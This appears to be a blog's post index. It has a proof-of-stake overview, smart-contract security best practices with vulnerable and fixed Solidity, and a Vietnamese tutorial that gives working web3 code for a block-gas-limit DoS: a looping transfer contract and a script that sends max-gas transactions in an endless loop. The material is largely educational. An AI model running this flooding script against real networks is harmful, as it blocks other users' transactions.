proof-of-stake, validators explicitly stake capital in the form of ether into a smart contract on Ethereum. This staked ether then acts as collateral that can be destroyed if the validator behaves dishonestly or lazily. The validator is then responsible for checking that new blocks propagated over the network are valid and occasionally creating and propagating new blocks themselvesIn Ethereum, to participate as a validator, a user must deposit 32 ETH into the deposit contract and run three separate pieces of software: an execution client, a consensus client, and a validator. On depositing their ether, the user joins an activation queue that limits the rate of new validators joining the network. Once activated, validators receive new blocks from peers on the Ethereum network. The transactions delivered in the block are re-executed, and the block signature is checked to ensure the block is valid. The validator then sends a vote (called an attestation) in favor of that block across the networkWhereas under proof-of-work, the timing of blocks is determined by the mining difficulty, in proof-of-stake, the tempo is fixed. Time in proof-of-stake Ethereum is divided into slots (12 seconds) and epochs (32 slots). One validator is randomly selected to be a block proposer in every slot. This validator is responsible for creating a new block and sending it out to other nodes on the network. Also in every slot, a committee of validators is randomly chosen, whose votes are used to determine the validity of the block being proposed.Delegate Proof of Stake (EOS, Cardano, Tron)Delegated Proof of Stake (DPoS) is a popular evolution of the PoS concept, whereby users of the network vote and elect delegates to validate the next block. Delegates are also called witnesses or block producers. Using DPoS, users can vote on delegates by pooling user’s tokens into a staking pool and linking those to a particular delegate. Users do not physically transfer user’s tokens to another wallet, but instead utilize a staking service provider to stake user’s tokens in a staking pool.A limited number of delegates (most protocols choose between 20 and 100) are chosen for each new block, so the delegates of one block might not be the delegates of the next. Elected delegates receive the transaction fees from the validated block, and that reward is then shared with users who pooled their tokens in the successful delegate’s pool. The more users stake, the higher a share of the block reward users receive. The rewards are shared based on each user’s stake; so if the user stake represents 5% of the total staking balance, the user would receive 5% of the block reward.Proof of Stake Authority (Binance Smart Chain)PoSA, as applied by the network, is a combination of Delegated Proof of stake (DPoS) and Proof of Authority (PoA).The DPoS is a form of staking model whereby validators put up a stake of the network’s native tokens to get a chance to validate transactions and create blocks. Technically, anyone with a minimum stake of the required tokens can become a validator, but the network would become sluggish if this were allowed. DPoS networks allow token holders to vote in a specified number of delegates to become validators. In the case of BSC, that number is 21 validators.PoA, represents a model in which validators are chosen or picked by a central party, in this case, Binance. The exchange vets all validators before they can be voted on by the delegators (token holders.) Think of it like a validator KYC where Binance approves who gets to participate in block creation.While the PoSA consensus model allows for short block times and lower costs, it comes at the cost of network decentralization and security. Due to this PoSA consensus model, a user cannot simply start validating transactions of the Binance Smart Chain themselves in the same way that they can with Bitcoin or Ethereum.Compare Consensus Props Cons Proof Of Stake - Provides fast and inexpensive transaction procession. - Validators with large holdings can have excessive influence on transaction verification. - Complexity to set up. Delegate Proof Of Stake - DPoS allows for block producers to validate transactions in seconds – providing faster transactions than PoS and PoW. - Delegates are elected through a democratic voting system, so each token holder has a say. - By putting validation into a small number of hands, Delegates can form cartels making the blockchain less decentralized and less resilient to attacks. Proof Of Stake Authority - Allow for short block times and lower costs - Low decentralization, low security. - Reputation cannot always keep participants from malicious actions. If the reward for fraud is more valuable than the authority, a participant can harm the system. SummaryProof-of-Stake (PoS) consensus mechanisms were designed to address inefficiencies inherent in conventional Proof-of-Work (PoW) protocols. Instead of relying on crypto mining, PoS blockchains use nodes selected based on their stake of platform tokens to verify and record transactions. The majority of new blockchain projects use some form of PoS consensus mechanism, as it is significantly more scalable, flexible, and environmentally friendly than PoW iterations. Hundreds of blockchain projects have so far implemented some form of PoS, and by improving network decision-making, scalability, and resource efficiency, this consensus-mechanism category is expected to play an increasingly integral role in the future of the blockchain industry.References What is proof of stake ? Proof Of Stake In Ethereum Varieties of Proof of Stake" }, { "title": "Block gas limit attack", "url": "/posts/block-gas-limit-attack/", "categories": "", "tags": "", "date": "2021-07-27 10:20:30 +0800", "snippet": "Blockchain Attack: Block gas limit attackBlog này hướng dẫn chi tiết sử dụng kĩ thuật DoS with Block gas limit (đã nhắc tới trong bài smart contract best practice 3) để tấn công 1 mạng blockchain.PreparationTrước khi bắt đầu tấn công mạng, ta cần tìm hiểu về blockchain network. Tìm hiểu về endpoint blockchain, luật đồng thuận, block struct của mạng và nhiều thứ khác.Trước tiên về network: nắm rõ luật đồng thuận của mạng (ở bài post này sẽ tấn công mạng ethereum sử dụng luật đồng thuận Proof of Work)Về Block Struct, bài post sử dụng cách thức tấn công block gas limit nên trước tiên sẽ tìm hiểu về thông số block gas limit của mạng.Tìm hiểu về cách thức block được tạo ra và cách các transaction được đưa vào trong block.Trên sẽ là các kiến thức nền tảng của blockchain cần biết trước khi bắt đầu vào thức hiện cuộc tấn công này.Trước tiên ta cần set up folder cho toàn bộ script để thực hiện việc tấn côngmkdir block_gas_limit_attackcd block_gas_limit_attackGet Block Gas LimitVới cuộc tấn công block gas limit, trước tiên ta sẽ tìm thông số block gas limit của mạng (sử dụng javascript và thư viện web3)npm install web3vim getGasLimit.jsThực hiện kết nối web3 với network:const Web3 = require(&quot;web3&quot;)const web3Provider = new Web3.providers.HttpProvider(&quot;network endpoint&quot;)const web3 = new Web3(web3Provider)console.log(web3)Lấy ra lastest block của mạng để kiểm tra tình trạng kết nối cũng như xem các thông số của block:async function getLastestBlock() { const block = await web3.eth.getBlock(&quot;latest&quot;) console.log(block)}getLastestBlock()Nhận được kết quả trả về:{ number: 2074747, hash: &#39;0xa587aa3b79e249fa13a799b700287a9a13f0aaeb90b5bdb59f019511a91a5843&#39;, mixHash: &#39;0x63746963616c2062797a616e74696e65206661756c7420746f6c6572616e6365&#39;, parentHash: &#39;0xb043c80558a303a6a6cff54ee12cb4c0c18d7d6c6d9875ca357ef792afee4aab&#39;, nonce: &#39;0x0000000000000000&#39;, sha3Uncles: &#39;0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347&#39;, logsBloom: &#39;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#39;, transactionsRoot: &#39;0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421&#39;, stateRoot: &#39;0xba29682e080d946de3d793b6d146cb3f9001f1ce6e4b088b7f2eb9e94707bc5e&#39;, receiptsRoot: &#39;0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421&#39;, miner: &#39;0x20f41061b59cdD1de39862dac8420Cde5B1C4611&#39;, difficulty: &#39;1&#39;, totalDifficulty: &#39;2074748&#39;, extraData: &#39;0xf90148a00000000000000000000000000000000000000000000000000000000000000000f854941e3415214147f480c4a82130fa2fc75f870799499420f41061b59cdd1de39862dac8420cde5b1c4611942de1ec20190935f197f83dfcb5c49b424d1f78e594adb2d82c0247ee35774840e95313b6330e199605808400000000f8c9b8419f92d5c3c7ded5ab0b91e29829e7473a36ec4b9fa99929feb4b48891571f2a8f104383eddac4c1d14a6c73c070af96dbedeb4d2843c900cc0c79677750e4879800b8415d8987fd2229dc77fdc84e559055e59e38293ffaac01f72015979ed27707fa4b2e6bcdf55b381cbb214d8730b7afa7fc22cf768e10428c1b251e815809d22ff900b841591a9516ccc936a1f45e787e5b99e608d83249c64eb18ff2a22a9c59f1a27b0c633ea0ead2660f1c7e7c7bf76edf821029e121719096eae1740981eb4e2f9c9601&#39;, size: 845, gasLimit: 1890884448, gasUsed: 0, timestamp: 1627361583, uncles: [], transactions: []}Đã thấy thông số gasLimit của block là 1890884448Để thực hiện Block Gas Limit Attack, như đã được nhắc tới trong bài Smart Contract Best Practice, chúng ta thức hiện việc gửi transaction tới network với lượng gas sử dụng xấp xỉ gas limit của block để chặn các transaction khác được thực thi - đây gọi là DoS with Block gas limit.Set up TruffleThực hiện việc gửi transaction với mức gas cao xấp xỉgas limit của block cách dễ nhất là sử dụng 1 custom smart contract thực hiện vòng lặp gửi token tới nhiều address trong 1 lời gọi hàmBắt đầu việc viết và test smart contract với truffletruffle unbox metacoinConnect truffle đến blockchain network// truffle-config.jsconst PrivateKeyProvider = require(&quot;@truffle/hdwallet-provider&quot;);const privateKey = &quot;private key&quot;;const privateKeyProvider = new PrivateKeyProvider(privateKey, &quot;RPC-URL&quot;);module.exports = { networks: { development: { provider: privateKeyProvider, host: &quot;node_host&quot;, port: &quot;node_port&quot;, network_id: &quot;chain_id&quot;, }, };}Thử việc deploy smart contract mẫu đến networktruffle migrateWrite Smart ContractViết 1 smart contract thực hiện chuyển token cho nhiều địa chỉ khác nhau, và sẽ sử dụng hết 1890884448 gas của 1 block trong 1 transactionTạo smart contract để thực hiện việc tấn côngcd contracts/vim Transfer.solCode 1 contract đơn giản thực hiện việc chuyển tokenpragma solidity &amp;gt;=0.4.25 &amp;lt;0.7.0;contract Transfer { address payable private owner; constructor() public { owner = msg.sender; } function transfer(uint number) public { for (uint x; x &amp;lt; number; x++) { owner.send(1); } }}Deploy contract lên network// migrations/1_initial_migration.jsconst Transfer = artifacts.require(&quot;Transfer&quot;);module.exports = function(deployer) { deployer.deploy(Transfer)};truffle deployChuyển 1 lượng token vừa đủ tới smart contract để thực hiện hackingStart HackingViết script thực hiện gọi hàm transfer của smart contractvim hacking.jsconst network_endpoint = &quot;network-endpoint&quot;const address = &quot;address&quot;const privateKey = &quot;privateKey&quot;const networkId = &quot;4444&quot;const gasLimit = 1890884448const Web3 = require(&quot;web3&quot;)const web3Provider = new Web3.providers.HttpProvider(network_endpoint)const web3 = new Web3(web3Provider)const Transfer = require(&quot;./build/contracts/Transfer.json&quot;)const contract = new web3.eth.Contract(Transfer.abi, Transfer.networks[networkId].address)async function hack() { web3.eth.accounts.wallet.add(privateKey) const tx = contract.methods.transfer(1000000) const data = tx.encodeABI(); let nonce = await web3.eth.getTransactionCount(address); while(true) { const signedTx = await web3.eth.accounts.signTransaction( { to: contract.options.address, data, gas: gasLimit, gasPrice: 0, nonce, chainId: networkId }, privateKey ); nonce++; web3.eth.sendSignedTransaction(signedTx.rawTransaction); }}hack()Sau khi gọi hàm thì có thể hàm thực thi đã fail trên blockchain network nhưng đã làm cho block bị sử dụng toàn bộ gas khiến các transaction khác đên trong thời điểm này sẽ nằm trong pool mãi mãi cho đến khi các miner thực hiện mở rộng blockSizeConclusionDDoS, là từ chối dịch vụ, chiếm hữu tài nguyên, kẻ tấn công sẽ thực hiện các request để chiếm hữu tài nguyên, lỗi này xảy ra sẽ làm cho hệ thống của mình bị nghẽn, không thể phục vụ user bình thường, blockchain cũng có lỗi này, khi lỗi này xảy ra sẽ làm tắc nghẽn khả năng xử lý của một node trong mạng.Lỗi blockGasLimit sẽ làm giảm hiệu năng và khả năng xử lý của 1 node trong mạng blockchain, mặc dù các miner có thể điều chỉnh gasLimit của một block để có thể khác phục lỗi này, nhưng điểu này có thể làm gia tăng phí gas và bùng nổ dữ liệu, nên các miner sẽ rất cân nhắc việc tăng blockSize.Lỗi này cũng gây chậm trễ transaction của các user, điều này thực sự nguy hiểm đối với các smart contract yêu cầu logic về thời gian, vì trong thời gian hacker thực hiện ddos blockchain network, user không thể thực hiện các logic liên quan tới thời gian của mình.SolutionMặc dù với các bản cập nhập của Ethereum, các lỗi này đã cơ bản được khắc phục bẳng cách các miner sẽ tự động tăng blockSize lên, nhưng vẫn làm cho các transaction của user bị delay 1 khoảng thời gian trước khi được thực sự xử lýSau đây sẽ là 1 số đề xuất khắc phục lỗi này: Xây dựng middleware để kiểm soát lượng gas trong 1 transaction được gửi tới node Chỉ cho phép gửi transaction với 1 số lượng nhất định Xây dựng các mô hình tránh spam khácThank you for your reading and keep update with me" }, { "title": "Smart contract best practice 3", "url": "/posts/smart-contract-best-practice-3/", "categories": "", "tags": "", "date": "2021-07-25 10:20:30 +0800", "snippet": "This blog provides a baseline knowledge of security considerations for Smart Contract developer in Ethereum Blockchain.A list of Known AttacksThe following is a list of known attacks which you should be aware of, and defend against when writing smart contracts.ReentrancyReentrancy on a Single FunctionThe first version of this bug to be noticed involved functions that could be called repeatedly, before the first invocation of the function was finished. This may cause the different invocations of the function to interact in destructive ways.function withdrawBalance() public { uint amountToWithdraw = userBalances[msg.sender]; (bool success, ) = msg.sender.call.value(amountToWithdraw)(&quot;&quot;); require(success); userBalances[msg.sender] = 0;}Since the user’s balance is not set to 0 until the very end of the function, the second (and later) invocations will still succeed, and will withdraw the balance over and over again.The best way to prevent this attack is to make sure you don’t call an external function until you’ve done all the internal work you need to do:function withdrawBalance() public { uint amountToWithdraw = userBalances[msg.sender]; userBalances[msg.sender] = 0; (bool success, ) = msg.sender.call.value(amountToWithdraw)(&quot;&quot;); require(success);}Cross-function ReentrancyAn attacker may also be able to do a similar attack using two different functions that share the same state.The same solutions will work, with the same caveats. Also note that in this example, both functions were part of the same contract. However, the same bug can occur across multiple contracts, if those contracts share state.Pitfalls in Reentrancy SolutionsSince reentrancy can occur across multiple functions, and even multiple contracts, any solution aimed at preventing reentrancy with a single function will not be sufficient.The best way to solve this, I have recommended finishing all internal work (ie. state changes) first, and only then calling the external functionHowever, you need to not only avoid calling external functions too soon, but also avoid calling functions which call external functionsAnother solution often suggested is Mutex. This allow contract “lock” some state so it can only be changed by the owner of lock.bool private lockLogic;function withdraw(uint _amount) payable public returns (bool) { require(!lockLogic); lockLogic = true; (bool success, ) = msg.sender.call(_amount).(&quot;&quot;); if (success) { balance[msg.sender] -= amount; } lockLogic = false; return true;}Front-run AttackBy defining a taxonomy and differentiating each group from another, I can make it easier to discuss the problem and find solutions for each group.I define the following categories of front-running attacks: Displacement Insertion SuppressionDisplacementIn the first type of attack, a displacement attack. It is not important for User function call to run after Adversary runs user functionThis attack is commonly performed by increasing the gasPrice higher than network average, often by a multiplier of 10 or more.InsertionFor this type of attack, it is important to the adversary that the original function call runs after user transactionThe attacker can insert transactions before or after logic of user’s smart contract executeSuppressionIn this type of attack, after attacker runs his function, he tries to delay user from running function.This was the case on-chain hacks, the attacker sent multiple transactions with high gasPrice and gasLimit to custom smart contracts that assert (or use other means) to consume all the gas and fill up the block’s gasLimitInteger Overflow and UnderflowConsider a simple token transfer:mapping (address =&amp;gt; uint256) public balanceOf;// INSECUREfunction transfer(address _to, uint256 _value) { require(balanceOf[msg.sender] &amp;gt;= _value); balanceOf[msg.sender] -= _value; balanceOf[_to] += _value;}// SECUREfunction transfer(address _to, uint256 _value) { /* Check if sender has balance and for overflows */ require(balanceOf[msg.sender] &amp;gt;= _value &amp;amp;&amp;amp; balanceOf[_to] + _value &amp;gt;= balanceOf[_to]); /* Add and subtract new balances */ balanceOf[msg.sender] -= _value; balanceOf[_to] += _value;}If a balance reaches the maximum uint value (2^256) it will circle back to zero which checks for the condition. This may or may not be relevant, depending on the implementation. Think about whether or not the uint value has an opportunity to approach such a large number. Think about how the uint variable changes state, and who has authority to make such changes. If any user can call functions which update the uint value, it’s more vulnerable to attack. If only an admin has access to change the variable’s state, you might be safe. If a user can increment by only 1 at a time, you are probably also safe because there is no feasible way to reach this limit.The same is true for underflow. If a uint is made to be less than zero, it will cause an underflow and get set to its maximum value.DoS with revertConsider a simple auction contract:contract Auction { address currentLeader; uint highestBid; function bid() payable { require(msg.value &amp;gt; highestBid); require(currentLeader.send(highestBid)); // Refund the old leader, if it fails then revert currentLeader = msg.sender; highestBid = msg.value; }}if attacker bids using a smart contract which has a fallback function that reverts any payment, the attacker can win any auction. When it tries to refund the old leader, it reverts if the refund fails. This means that a malicious bidder can become the leader while making sure that any refunds to their address will always fail.Solutions here, we should set up a pull payment system instead, using two function for bid and withdraw money.Another example, when smart contract may iterate through an array to pay users. The issue is that if one call fails, you are reverting the whole payout system, meaning the loop will never completeaddress[] private refundAddresses;mapping (address =&amp;gt; uint) public refunds;// badfunction refundAll() public { for (uint x; x &amp;lt; refundAddresses; x++) { require(refundAddresses[x].send(refunds[refundAddresses[x]])); }}DoS with Block gas limitEach block has an upper bound on the amount of gas that can be spent, and thus the amount computation that can be done. This is the Block Gas Limit. If the gas spent exceeds this limit, the transaction will fail.Gas Limit DoS on a Contract via Unbounded OperationsYou may have noticed another problem with the previous example: by paying out to everyone at once, you risk running into the block gas limit.If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. You will need to keep track of how far you’ve gone, and be able to resume from that point, as in the following example:struct Payee { address addr; uint256 value;}Payee[] payees;uint256 nextPayeeIndex;function payOut() public { uint256 i = nextPayeeIndex; while (i &amp;lt; payees.length &amp;amp;&amp;amp; msg.gas &amp;gt; 200000) { payees[i].addr.send(payees[i].value); i++; } nextPayeeIndex = i;}You will need to make sure that nothing bad will happen if other transactions are processed while waiting for the next iteration of the payOut() function. So only use this pattern if absolutely necessary.Gas Limit DoS on the Network via Block StuffingEven if your contract does not contain an unbounded loop, an attacker can prevent other transactions from being included in the blockchain for several blocks by placing computationally intensive transactions with a high enough gas price.To do this, the attacker can issue several transactions which will consume the entire gas limit, with a high enough gas price to be included as soon as the next block is mined. No gas price can guarantee inclusion in the block, but the higher the price is, the higher is the chance.A Block Stuffing attack can be used on any contract requiring an action within a certain time period. However, as with any attack, it is only profitable when the expected reward exceeds its cost. Cost of this attack is directly proportional to the number of blocks which need to be stuffed. If a large payout can be obtained by preventing actions from other participants, your contract will likely be targeted by such an attack.Insufficient gas griefingThis attack may be possible on a contract which accepts generic data and uses it to make a call another contract (a ‘sub-call’) via the low level address.call() function, as is often the case with multisignature and transaction relayer contracts.Take the following example of a simplified Relayer contract which continues execution regardless of the outcome of the subcall:contract Relayer { mapping (bytes =&amp;gt; bool) executed; function relay(bytes _data) public { // replay protection; do not call the same transaction twice require(executed[_data] == 0, &quot;Duplicate call&quot;); executed[_data] = true; innerContract.call(bytes4(keccak256(&quot;execute(bytes)&quot;)), _data); }}This contract allows transaction relaying. Someone who wants to make a transaction but can’t execute it by himself (e.g. due to the lack of ether to pay for gas) can sign data that he wants to pass and transfer the data with his signature over any medium. A third party “forwarder” can then submit this transaction to the network on behalf of the user.If given just the right amount of gas, the Relayer would complete execution recording the _data argument in the executed mapping, but the subcall would fail because it received insufficient gas to complete execution.One way to address this is to implement logic requiring forwarders to provide enough gas to finish the subcall. If the miner tried to conduct the attack in this scenario, the require statement would fail and the inner call would revert. A user can specify a minimum gasLimit along with the other data (in this example, typically the _gasLimit value would be verified by a signature, but that is ommitted for simplicity in this case).contract Executor { function execute(bytes _data, uint _gasLimit) { require(gasleft() &amp;gt;= _gasLimit); ... }}Forcibly Sending Ether to a ContractIt is possible to forcibly send Ether to a contract without triggering its fallback function. This is an important consideration when placing important logic in the fallback function or making calculations based on a contract’s balance. Take the following example:contract Vulnerable { function () payable { revert(); } function somethingBad() { require(this.balance &amp;gt; 0); // Do something bad }}Contract logic seems to disallow payments to the contract and therefore disallow “something bad” from happening. However, a few methods exist for forcibly sending ether to the contract and therefore making its balance greater than zero.The selfdestruct contract method allows a user to specify a beneficiary to send any excess ether. selfdestruct does not trigger a contract’s fallback function.Thank you for your reading and keep update with me" }, { "title": "Smart contract best practice 2", "url": "/posts/smart-contract-best-practice-2/", "categories": "", "tags": "", "date": "2021-07-15 17:20:30 +0800", "snippet": "This blog provides a baseline knowledge of security considerations for Smart Contract developer in Ethereum Blockchain.Recommendations for Smart Contract Security in codingThis session demonstrates a number of design patterns which should generally be followed when writing smart contractsExternal CallsUse caution when making external calls and make untrusted contractCalls to untrusted contracts can introduce several unexpected risks or errors. External calls may execute malicious code in that contract or any other contract that it depends upon.When interacting with external contracts, name your variables, methods, and contract interfaces in a way that makes it clear that interacting with them is potentially unsafeUntrustedBank.withdraw(100); //untrusted external callTrustedBank.withdraw(100); //trusted contractfunction makeUntrustedWithdrawal(uint amount) { UntrustedBank.withdraw(amount);}Avoid state changes after external callsWhenever using raw calls (someAddress.call()) or contract calls (externalContract.method()), always assume that malicious code might execute.Using the Checks-Effects-Interactions PatternHandle errors in external callsSolidity offers low-level call methods that work on raw addresses: address.call(), address.callcode(), address.delegatecall() and address.send(). These low-level methods never throw an exception, but will return false if the call encounters an exception(bool success, ) = someAddress.call.value(55).(bytes4(sha3(&quot;deposit()&quot;)));if (!success) { // handle exception}Don’t delegatecall to untrusted codeThe delegatecall function is used to call functions from other contracts as if they belong to the caller contract. Thus the callee may change the state of the calling address. This may be insecure. An example below shows how using delegatecall can lead to the destruction of the contract and loss of its balance.On-chain data is publicIf we require submitted data to be private up until some point in time in order to work, the best strategy is use commitment schemes with separate phases: first commit using the hash of the values and in a later phase revealing the values.Example: In an auction, require players to submit a hash of their bid value in an initial phase (along with a deposit greater than their bid value), and then submit their auction bid value in the second phase.Beware of negation of the most negative signed integerSolidity provides several types to work with signed integers. Like in most programming languages, in Solidity a signed integer with N bits can represent values from -2^(N-1) to 2^(N-1)-1.Enforce invariantsAn assert guard triggers when an assertion fails, use assert to verify data all the time function execute.It wil throw message when an assertion fails, an external service can handle it.function deposit() public payable { balanceOf[msg.sender] += msg.value; totalSupply += msg.value; assert(this.balance &amp;gt;= totalSupply); // this trigger balance of token contract will larger than totalSupply} In Ethereum, you can use both assert() and require(). require(condition) is meant to be used for input validation, which should be done on any user input, and reverts if the condition is false. assert() also reverts if the condition is false but should be used only for invariants: internal errors or to check if your contract has reached an invalid state. Following this paradigm allows formal analysis tools to verify that the invalid opcode can never be reached: meaning no invariants in the code are violated and that the code is formally verified. The convenience functions assert and require can be used to check for conditions and throw an exception if the condition is not met. The assert function should only be used to test for internal errors, and to check invariants. The require function should be used to ensure valid conditions, such as inputs, or contract state variables are met, or to validate return values from calls to external contracts.Use modifiers only for checksUse modifiers to replace duplicate condition checks in multiple functions, such as isOwner(), otherwise use require or revert inside the function. This makes smart contract code more readable and easier to audit.Beware rounding with integer divisionAll integer division rounds down to the nearest integer. If you need more precision, consider using a multiplier, or store both the numerator and denominator.Explicitly mark visibility in functions and state variablesExplicitly label the visibility of functions and state variables. Functions can be specified as being external, public, internal or private external functions are part of the contract interface. An external function f cannot be called internally (i.e. f() does not work, but this.f() works). external functions are sometimes more efficient when they receive large arrays of data public functions are part of the contract interface and can be either called internally or via messages. For public state variables, an automatic getter function is generated. internal functions and state variables can only be accessed internally, without using this. private functions and state variables are only visible for the contract they are defined in and not in derived contracts.Lock pragmas to specific compiler versionContracts should be deployed with the same compiler version and flags that they have been tested the most with. Locking the pragma helps ensure that contracts do not accidentally get deployed using, for example, the latest compiler which may have higher risks of undiscovered bugs. Contracts may also be deployed by others and the pragma indicates the compiler version intended by the original authors.// badpragma solidity ^0.4.4;// goodpragma solidity 0.4.4; Pragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or EthPM package. Otherwise, the developer would need to manually update the pragma in order to compile locally.Use events to monitor contract activityIt can be useful to have a way to monitor the contract’s activity after it was deployed. One way to accomplish this is to look at all transactions of the contract, however that may be insufficient, as message calls between contracts are not recorded in the blockchain. Moreover, it shows only the input parameters, not the actual changes being made to the state. Also events could be used to trigger functions in the user interface.Avoid using tx.originNever use tx.origin for authorization, another contract can have a method which will call your contractMultiple Inheritance CautionWhen a contract is deployed, the compiler will linearize the inheritance from right to left (after the keyword is the parents are listed from the most base-like to the most derived).contract Final { uint public a; function Final(uint f) public { a = f; }}contract B is Final { int public fee; function B(uint f) Final(f) public { } function setFee() public { fee = 3; }}contract C is Final { int public fee; function C(uint f) Final(f) public { } function setFee() public { fee = 5; }}contract A is B, C { function A () public B(3) C(5) public { setFee(); }}Contract A’s linearization: Final &amp;lt;- B &amp;lt;- C &amp;lt;- A.The consequence of the linearization will yield a fee value of 5, since C is the most derived contractUse interface type instead of the address for type safetyWhen a function takes a contract address as an argument, it is better to pass an interface or contract type rather than raw address. If the function is called elsewhere within the source code, the compiler it will provide additional type safety guarantees.Thank you for your reading and keep update with me" }, { "title": "Smart contract best practice 1", "url": "/posts/smart-contract-best-practice-1/", "categories": "", "tags": "", "date": "2021-07-15 15:17:30 +0800", "snippet": "This blog provides a baseline knowledge of security considerations for Smart Contract developer in Ethereum Blockchain.Change your mindsetSmart contract programming requires a different engineering mindset than you may be used to. It is therefore not enough to defend against known vulnerabilities. Instead, you will need to learn a new philosophy of development.General PhilosophyEthereum is new highly experimental. Therefore, you should expect constant changes in the security landscape, as new bugs and security risks are discovered, and new best practices are developed.Prepare for failureAny contract can have error in it, your code must be able response to bugs and vulnerabilities gracefully. Pause the contract when things are going wrong. Manage the amount of money at risk. Have an effective upgrade path for bugfixes and improvements. Figure out effective ways to fix bugs and improve functionality.Keep contracts simpleComplexity increases the likelihood of errors. Ensure the contract logic is very simple. Use already-written tools or code where possible. Modular, reuses code instead of duplicating it, and supports upgradeable components. Clarity is more important than performance when allows.Be aware of blockchain properties Be extremely careful about external contract calls, which may execute malicious code and change control flow. Understand that public functions are public, and may be called maliciously. Private data is also viewable by anyone.Keep updatedEnsure access to the latest security developments by disclosing resources Check your smart contract when any new vulnerabilities are discovered. Update the library or tool as quickly as possible when possible. Use the latest security technologies. Get clear understanding of blockchain features.Thank you for your reading and keep update with me" } ]
